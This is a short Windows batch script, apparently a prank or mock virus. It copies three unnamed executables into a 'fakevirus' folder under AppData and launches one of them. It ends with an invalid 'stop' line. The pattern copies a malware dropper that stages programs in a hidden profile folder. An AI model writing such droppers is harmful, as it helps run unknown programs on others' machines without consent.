@echo off
mkdir %AppData%\fakevirus
copy 645.exe %AppData%\fakevirus
copy 576.exe %AppData%\fakevirus
copy 283.exe %AppData%\fakevirus
start %AppData%\fakevirus\645.exe
stop